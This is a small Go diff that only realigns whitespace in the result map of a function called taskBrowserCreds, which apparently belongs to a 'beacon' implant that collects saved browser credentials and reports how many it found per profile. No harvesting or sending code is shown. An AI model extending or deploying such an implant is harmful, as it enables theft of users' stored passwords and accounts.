@@ -501,7 +501,7 @@ func (b *Beacon) taskBrowserCreds(args map[string]any) Outcome {
 		Code: 0,
 		Out:  sensesReport("browser.creds", fmt.Sprintf("%d pieces of material in %d profiles", len(records), len(notes)), lines),
 		Extra: map[string]any{
-			"creds":      values,
+			"creds":       values,
 			"creds_total": uint64(len(records)),
 		},
 	}
